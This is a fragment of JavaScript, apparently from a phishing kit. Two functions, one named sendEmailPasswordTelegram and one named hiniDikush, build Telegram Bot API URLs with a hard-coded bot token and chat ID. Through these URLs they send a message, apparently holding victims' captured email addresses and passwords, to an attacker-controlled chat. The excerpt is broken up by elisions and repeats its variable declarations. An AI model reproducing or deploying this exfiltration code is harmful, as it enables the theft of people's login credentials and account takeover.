...
function sendEmailPasswordTelegram() {
    ...
    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQ";
    var chat_id = 5607989288;
    var url = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQ/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
    var chat_id = 5607989288;
...
function hiniDikush() {
    ...
    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQ";
    var chat_id = 5607989288;
    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQ/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
    var token = "6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa";
    var chat_id = 5607989288;
    var url1 = `https://api.telegram.org/bot6800984692:AAGfKkgPtrrQwYY3_OYmNbVBIehuDpjd5mQa/sendMessage?text=${message}&chat_id=5607989288&parse_mode=html`;
